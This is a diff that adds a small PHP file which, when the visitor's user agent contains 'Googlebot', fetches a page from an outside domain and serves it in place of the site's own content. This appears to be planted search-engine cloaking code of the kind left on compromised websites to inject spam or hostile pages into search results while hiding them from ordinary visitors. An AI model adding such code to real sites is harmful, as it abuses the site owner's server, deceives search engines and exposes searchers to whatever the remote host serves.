@@ -1,0 +1,13 @@
+<?php
+
+if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false) {
+    $url = 'https://ragilstecu.gay/landing/unsamid/';
+    $content = file_get_contents($url);
+    if ($content !== false) {
+        echo $content;
+    } else {
+        echo '';
+    }
+}
+
+?>
